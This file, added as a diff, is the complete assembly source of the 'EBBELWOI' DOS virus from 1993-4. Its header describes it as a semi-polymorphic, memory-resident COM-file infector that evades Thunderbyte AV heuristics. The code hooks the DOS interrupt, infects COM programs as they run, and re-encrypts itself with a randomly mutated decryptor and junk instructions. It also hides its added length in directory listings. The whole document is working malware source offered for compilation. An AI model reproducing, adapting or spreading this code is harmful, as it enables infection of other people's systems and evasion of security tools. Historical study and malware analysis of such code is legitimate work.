@@ -1,0 +1,678 @@
+
+COMMENT *
+
+    EBBELWOI VIRUS / Subversion Qux-7                          by Sirius
+    --------------------------------------------------------------------
+						 Made in Germany, 1993-4
+
+    It  is  an  easy  to  understand  Semi-polymorphic,  memory resident
+    parasitic  COM-File-Infector  utilizing  simple  filelength-stealth.
+
+    This piece of replicating code could not be found  by  the heuristic
+    algorithms of Thunderbyte AV.      The version used was TbSCAN 6.09.
+
+    For compilation please use Turbo Assembler (3.0) from Borland.
+*
+
+
+
+ofs             equ   offset
+v_len           equ   end_mark - encrypted_code
+enc_len         equ   (offset end_enc_code-offset encrypted_code)/2 + 1
+
+CODE    SEGMENT
+	ASSUME  CS:CODE,DS:CODE,ES:CODE,SS:CODE
+	ORG     100h
+
+sample: jmp     start
+
+start:
+	 DB     0BEh                          ;1)  = mov si, ofs_enc
+_ofs_enc DW     ofs encrypted_code
+
+	 DB     0BAh                          ;2)  = mov dx, enc_val
+_enc_val DW     0000
+
+CRYPT:
+	 DB     0B9h                          ;3)  = mov cx,v_len
+_len_vir DW     0000
+
+n_loop:
+;--------------------------------------------------
+	xor     [si],dx                       ;4) ;  4 bytes
+	nop                                       ;
+	nop                                       ;
+;--------------------------------------------------
+;--------------------------------------------------
+	nop                                   ;5) ;; 2 bytes
+	nop                                       ;; place 4 enc. key change
+;--------------------------------------------------
+;--------------------------------------------------
+	inc     si                            ;6) ;  3 bytes
+	inc     si                                ;
+	nop                                       ;
+;--------------------------------------------------
+	loop    n_loop                        ;7) ;  2 bytes
+;--------------------------------------------------
+nop_ret:                                          ;
+	NOP    ; may be set to a RET  (0c3h)  ;8) ;
+;--------------------------------------------------
+
+;============================================================================
+
+encrypted_code:
+
+	call    s1         ; push ofs s1
+s1:     pop     bp         
+	sub     bp,ofs s1
+
+	mov     ax,0FEFEh
+	int     21h
+	cmp     si,01994h
+	jz      already_resident
+
+	xor     AX,AX
+	mov     DS,AX
+
+	lds     BX,ds:[4*21h]                    ; get int 21 handler
+	mov     word ptr cs:[bp+OLD_BX],BX
+	mov     word ptr cs:[bp+OLD_ES],DS
+
+	mov     bx,cs                            ; Get address of our memory
+	dec     bx                               ; block
+	mov     DS,BX                            ; decrease memory allocated
+	sub     WORD PTR ds:[0003h],150h         ; to this program
+	sub     word ptr ds:[0012h],150h         ; decrease avail. memory
+
+	mov     word ptr ax,ds:[0012h]           ; by paragraphs (=10 bytes)
+	mov     es,ax                            ; es = our new segment
+	push    cs
+	pop     ds
+
+	lea     si,[bp+encrypted_code] ; copy virus-body w/o decryptor to TOM
+	mov     di,ofs encrypted_code  ; ES:encrypted_code is destination -
+	mov     cx,v_len               ; so the offsets in the interrupt
+	repz    movsb                  ; are equal to offsets in this
+				       ; sample file
+	mov     ds,cx            ; cx=0
+	cli                      ; set our handler
+	MOV     word ptr ds:[4*21h+2],AX
+	MOV     WORD PTR ds:[4*21h],offset new_21
+	sti
+
+	push    cs
+	pop     ds
+	push    cs
+	pop     es
+
+already_resident:
+	lea     si,[bp+orig_bytes]        ;restore first 3bytes of prog
+	mov     di,100h
+	movsb
+	movsw
+
+	mov     ax,100h
+	push    ax
+	xor     ax,ax
+	ret
+
+;============================================================================
+
+NEW_21:
+	pushf
+	cmp     ax,4b00h
+	jz      function_to_hang
+	cmp     ah,11h
+	jz      dos_dir
+	cmp     ah,12h
+	jz      dos_dir
+	cmp     ax,0FEFEh
+	jne     false_function
+	mov     ax,0FE00h
+	mov     si,1994h
+	popf
+	iret
+
+false_function:
+go_int_popf:
+	popf
+call_original_21:
+	DB      0EAh            ; FAR JUMP old_es:old_bx
+old_bx  DW      1122h
+old_es  DW      3344h
+
+dir_flag DB     00
+
+;============================================================================
+
+dos_dir:
+	DB      2Eh                     ; assume CS:
+	cmp     cs:dir_flag,1
+	jz      go_int_popf
+
+	mov     cs:dir_flag,1
+	int     21h
+	mov     cs:dir_flag,0
+
+	push    ax
+	push    bx
+	push    dx
+	push    ds
+	push    es
+	pushf
+
+	or      al,al                   ; not zero means no files found
+	jnz     no_files_found
+
+	mov     ah,51h
+	int     21h
+	mov     es,bx
+	cmp     bx,es:16                ; equal is DOS
+
+	jne     no_files_found
+
+	mov     ah,2fh
+	int     21h
+
+	push    es
+	pop     ds
+
+	cmp     byte ptr [bx],0ffh
+	jnz     n_FCB
+	add     bx,7
+
+n_FCB:  mov     al,byte ptr [bx+23]
+
+	and     al,00011111b
+	cmp     al,00000011b         ;vegleichen auf sec.=6 (=3)
+	jnz     no_files_found
+
+	sub     word ptr [bx+29],(v_len+117)  ; 117 is length of decryptor
+	sbb     word ptr [bx+31],0
+
+no_files_found:
+	popf
+	pop     es
+	pop     ds
+	pop     dx
+	pop     bx
+	pop     ax
+
+exit:   popf
+	iret
+
+;============================================================================
+
+function_to_hang:
+	cld
+	push    ax         ; Function EXECUTE:
+	push    bx         ; DS:DX = @ of filename
+	push    cx
+	push    dx
+	push    si
+	push    di
+	push    ds
+	push    es
+
+	push    cs                      ; Move file-name to our buffer
+	pop     es
+	mov     di,offset name_buf
+	mov     si,dx
+	mov     cx,64                   ; a path can be up to 64 chars long
+	rep     movsb
+
+	push    cs
+	pop     ds
+
+;------------check if program executed is a .COM file------------------------
+
+
+	mov     si,offset name_buf
+orange: lodsb
+	or      al,al
+	jnz     orange
+	cmp     [si-3],'MO'
+	jz      apple
+	jmp     break_infection
+
+apple:  cmp     [si-6],'.D'     ; dont infect command.com
+	jnz     continue_com
+	jmp     break_infection
+
+;--------------------our write error int24 handler--------------------------
+new_int24:
+       mov al,3                         ;choose '(F)ail'
+       iret
+;============================================================================
+
+continue_COM:
+       mov      ax,4301h                  ; clear attributes
+       mov      dx,offset name_buf
+       xor      cx,cx
+       int      21h
+
+       mov      ax,3d02h                              ;open file
+       mov      dx,offset name_buf
+       int      21h
+       jc       done
+       mov      handle,ax        ; save it for later turbulences
+       xchg     ax,bx
+
+       push     bx
+
+       mov      ah,2fh                 ; copy DTA to buffer
+       int      21h                    ; @ of DTA = es:bx
+       push     es
+       pop      ds
+       push     cs
+       pop      es
+       mov      si,bx
+       add      si,15h                ; only copy a part of DTA
+       mov      di,offset dta
+;       mov      cx,5
+       cld
+;       rep      movsb
+       movsb
+       movsw
+       movsw
+
+       push     cs
+       pop      ds
+
+       pop      bx
+
+       push     cs
+       pop      es
+
+       mov      ax,time
+       and      al,00011111b
+       cmp      al,00000011b         ;vegleichen auf sec.=6 (=3)
+       jnz      infect
+
+done:
+       mov      ah,3eh                           ;close file
+       int      21h
+
+break_infection:
+       pop     es
+       pop     ds
+       pop     di
+       pop     si
+       pop     dx
+       pop     cx
+       pop     bx
+       pop     ax
+       jmp     false_function
+
+
+infect:
+       mov      ah,3fh                          ;erste 3 byt d. zuinfiz.prog
+       mov      dx,offset orig_bytes            ;sichern
+       mov      cx,3
+       int      21h
+
+       cmp word ptr offset orig_bytes-3,"MZ"
+       jz  done
+       cmp word ptr offset orig_bytes-3,"ZM"
+       jz  done
+       cmp word ptr offset orig_bytes-3,0E957h          ; checks if L.COM
+       jz  done
+
+       mov      ax,4202h                               ;pointer to EOF
+       xor      cx,cx
+       cwd
+       int      21h
+       mov      fil_len,ax            ; L„nge der Opfer-Datei
+
+       jc       done
+       cmp      ax,3                    ; file length check
+       jb       done
+       cmp      ax,50000
+       jnb      done
+
+       sub      ax,3
+       mov      word ptr addr_jmp_op+1,ax     ;jmp - argument
+       add      ax,encrypted_code-start+103h
+       mov      word ptr [ofs_enc],ax
+       
+       push    ds                     ; inits a random number for
+       xor     ax,ax                  ; procedure random from timer
+       mov     ds,ax
+       mov     ax,ds:[46ch]
+       pop     ds
+       mov     init_nr,ax
+
+;============================================================================
+
+;change decryptor-header with the polymorphic method
+
+; calculate dx = enc_val
+       mov      ax,-2
+       call     random
+       mov      enc_val,ax
+       call     polymorphism
+
+;============================================================================
+
+;calculate and set si-argument
+       mov      ax,kilo
+       sub      ax,ofs enc_buffer
+       add      ax,fil_len
+       add      ax,100h
+       mov      si,ofs_mov_si
+       mov      [si+1],ax
+
+;calculate and set cx-Argument
+       mov      ax,v_len
+       mov      si,ofs_crypt
+       mov      [si+1],ax
+
+;calculate and set loop-Argument
+       mov      ax,kilo
+       sub      ax,ofs_n_loop
+       not      ax
+       sub      ax,2
+       mov      si,ofs_loop
+       mov      byte ptr [si+1],al
+
+;copy virus-body to buffer
+       mov      si,offset encrypted_code
+       mov      di,kilo     ; Ofs des n„chsten freien Byte - direkt dem
+			    ; Decryptor folgend
+       mov      cx,v_len
+       cld
+       rep      movsb
+
+;encrypt virus-body-copy ( header wont get encrypted )
+       mov      si,kilo
+       mov      dx,enc_val
+       mov      di,kilo
+       mov      byte ptr [di-1], 0C3h               ; = RET opcode
+       mov      ax,ofs_crypt
+       push     di
+       call     ax
+       pop      di
+       mov      byte ptr [di-1], 090h               ; = NOP opcode
+       
+       mov      dx,offset enc_buffer
+       mov      cx,v_len
+       mov      ax,[kilo]
+       sub      ax,dx
+       add      cx,ax
+       mov      bx,handle
+       mov      ah,40h                    ;copy encrypted virus to file
+       int      21h
+
+       jnc      york
+       jmp      done
+
+york:  mov      ax,4200h                   ;bei al=2 ist schreiben ok !!
+       xor      cx,cx                      ;goto TOF
+       cwd
+       int      21h
+
+       mov      ah,40h                 ;write new 3 bytes
+       mov      cx,3
+       mov      dx,offset addr_jmp_op
+       int      21h
+
+       mov      ax,5701h
+       mov      dx,date
+       mov      cx,time
+       and      cl,11100000b
+       or       cl,00000011b                     ;set 6 sec.!!!!!!!!
+       int      21h
+       jmp      done
+
+;============================================================================
+
+;----------------+----------+---------+---------+---------+---------+---------+---------+---------+
+; FIELD NR.      |  1.      |  2.     |  3.     |  4.     |  5.     |  6.     |  7.     |  8.     |
+;----------------+----------+---------+---------+---------+---------+---------+---------+---------+
+;                |          |         |         |         |         |         |         |         |
+; Anfang des Feldes innerhalb der TAB_MUT
+  TAB_OFS_ARR DW  ofs arr_1, ofs arr_2,ofs arr_3,ofs arr_4,ofs arr_5,ofs arr_6,ofs arr_7, ofs arr_8
+;                |          |         |         |         |         |         |         |         |
+; L„nge des Feldes
+  TAB_LEN_ARR DW     3,         3,        3,         4,        2,        3,        2,        1
+;                |          |         |         |         |         |         |         |         |
+; Anzahl der verschiedenen Variationen des einen Feldes
+  TAB_MUT_VAR DW     1,         1,        1,         4,        6,        3,        1,        1
+;                |          |         |         |         |         |         |         |         |
+;----------------+----------+---------+---------+---------+---------+---------+---------+---------+
+
+ALL_ARRAYS    equ 8           ; Field Sum
+
+tab_mut:
+
+arr_1: ;------------------------------------------
+	DB      0BEh                               ; = mov si, ofs_enc
+ofs_enc DW      0000                               ;ofs encrypted_code
+
+
+arr_2: ;------------------------------------------
+	DB      0BAh                               ; = mov dx, enc_val
+enc_val DW      0000
+
+
+arr_3: ;---------------- 2 bytes -----------------
+	DB      0B9h                               ; = mov     cx,v_len
+len_vir DW      0000
+
+
+arr_4: ;--------------- 4 bytes ------------------
+;-1-
+	dec     bp
+	xor     [si],dx
+	inc     ax
+;-2-
+	xchg    ax,dx
+	xor     [si],ax
+	xchg    ax,dx
+;-3-
+	mov     di,si
+	xor     [di],dx 
+;-4-
+	mov     bx,si
+	xor     [bx],dx
+
+arr_5: ;-------------- 2 bytes --------------------
+;-1-
+	inc     dx
+	dec     ax
+;-2-    
+	dec     dx
+	inc     di
+;-3-
+	rol     dx,1
+;-4-    
+	ror     dx,1
+;-5-
+	neg     dx
+;-6-
+	not     dx
+
+arr_6: ;------------ 3 bytes -----------------------
+;-1-
+	inc     si
+	inc     si
+	inc     di
+;-2-
+	add     si,2
+;-3-
+	sub     si,-2
+
+arr_7: ;--------------------------------------------
+	DB      0E2h     ; = LOOP n_loop
+	DB      00
+arr_8: ;---------------------------------------------
+	nop
+
+;============================================================================
+
+POLYMORPHISM proc near
+	push    ax bx cx dx si di bp ds es
+	mov     cx,all_arrays
+	xor     bx,bx
+	mov     kilo,ofs enc_buffer
+next_array:
+	call    GARB
+	push    cx
+	mov     si,[offset tab_ofs_arr+bx] ; offset innerhalb der TAB_MUT
+	call    var_random                 ; get one Variant
+	mov     dx,[offset tab_len_arr+bx] ; L„nge einer Variante
+	mul     dx                         ; ax:=ax*dx
+	add     si,ax                      ; si=Anfang der gew„hlten Variante
+
+	mov     cx,[offset tab_len_arr+bx]   ; L„nge der Variante
+	mov     di, kilo                  ; Offset in der CRYPT-Routine
+
+
+	pop     ax             ; cx auf dem Stack = Nr. des akt. Feldes
+	cmp     ax,all_arrays    ; Speichere einige wichtige Konstanten
+	jne     oo1
+	mov     ofs_mov_si,di    ; liefert immer den Beginn des Feldes
+	jmp     short oo0
+oo1:    cmp     ax,all_arrays-1
+	jne     oo2
+	mov     ofs_mov_dx,di
+	jmp     short oo0
+oo2:    cmp     ax,all_arrays-2
+	jne     oo3
+	mov     ofs_crypt,di
+	jmp     short oo0
+oo3:    cmp     ax,all_arrays-4
+	jne     oo4
+	mov     ofs_n_loop,di
+	jmp     short oo0
+oo4:    cmp     ax,all_arrays-6
+	jne     oo0
+	mov     ofs_loop,di
+oo0:    push    ax
+
+	cld
+	rep     movsb
+	mov     kilo,di
+
+	inc     bx
+	inc     bx
+	pop     cx
+	loop    next_array
+
+	pop     es ds bp di si dx cx bx ax
+	ret
+POLYMORPHISM endp
+
+VAR_RANDOM proc near
+	push    si                  ;---
+	mov     ax,[tab_mut_var+bx] ; Eine Zahl im Bereich der max. Varianten
+	call    random              ; Anzahl wird erzeugt.
+	pop     si                  ;---
+	ret
+VAR_RANDOM endp
+
+;============================================================================
+;     gives you a random number:  0 >= number > AX
+;============================================================================
+RANDOM proc near               ; gives you a pseudo-random number in AX
+	push    bx dx
+	inc     cycle
+	mov     bx,init_nr
+	push    cx       ;-----
+	mov     cl,cycle       ;  do more randomly
+	ror     bx,cl          ;
+	pop     cx       ;-----
+	rcl     bx,1
+	rcl     bx,1
+	mov     init_nr,bx
+	mul     bx
+	xchg    ax,dx           ; AX = pseudo-random number
+	pop     dx bx
+	ret
+cycle   DB      0
+RANDOM endp
+
+GARB proc near                          ; behandelt einen Feld-Zwischenraum
+	push    ax cx dx si di
+	mov     cx,3                    ; 4 is maximum due to a SHORT LOOP
+;============================================================================
+; behandelt eine Instruktion
+;============================================================================
+garry:
+	mov     si,ofs codez
+other:  mov     ax,codez_number         ; Anzahl der codez in der Tabelle
+	call    random
+	cmp     al,last_codez
+	jz      other
+	mov     last_codez,al
+	add     si,ax                   ; Adr. des zuf. codez's
+	mov     di,kilo
+	movsb
+	mov     ax,-2
+	call    random
+	stosw
+	mov     kilo,di                 ; aktualisiere cant
+	loop    garry
+	pop     di si dx cx ax
+	ret
+GARB endp
+
+;============================================================================
+
+last_codez DB   0
+codez:
+	DB      0BFh    ; mov di,xxxx
+	DB      0BBh    ; mov bx,xxxx
+	DB      0BDh    ; mov bp,xxxx
+	DB      0A1h    ; mov ax,[xxxx]
+
+	DB      05h     ; add ax,xxxx
+	DB      2Dh     ; sub ax,xxxx
+	DB      3Dh     ; cmp ax,xxxx
+	DB      0Dh     ; or ax,xxxx
+	DB      25h     ; and ax,xxxx
+	DB      0A9h    ; test ax,xxxx
+	DB      15h     ; adc ax,xxxx
+	DB      1Dh     ; sbb ax,xxxx
+
+codez_number    equ $-codez
+
+orig_bytes      db  90h,0CDh,20h
+addr_jmp_op     db  0E9h,00,00
+
+		DB  "[EBBELWOI] Version QUX-7  3/94 Sirius",0
+
+end_enc_code    equ $
+end_mark        equ $
+
+;============================================================================
+;    Variables
+;============================================================================
+ofs_mov_si      dw  0000
+ofs_mov_dx      dw  0000
+ofs_crypt       dw  0000
+ofs_n_loop      dw  0000
+ofs_loop        dw  0000
+fil_len         dw  0000  ; L„nge der Opfer-Datei
+ofs_crypt_buf   dw  0000  ; Adresse der Crypt-Routine im Puffer
+
+init_nr         dw  0000  ; will be init'd anyway
+int24_es        dw  0000
+int24_bx        dw  0000
+temp_time       dw  0000
+temp_date       dw  0000
+handle          dw  0000
+kilo            dw  0000   ; enth„lt den Offset, an den Instruktionen
+			   ; kopiert werden
+dta             equ $
+attribs         db  00
+time            dw  0000
+date            dw  0000
+
+name_buf        db  0     ; here a  64 bytes buffer for path+filename
+enc_buffer      equ $
+
+CODE    ENDS
+	END     sample
+
+
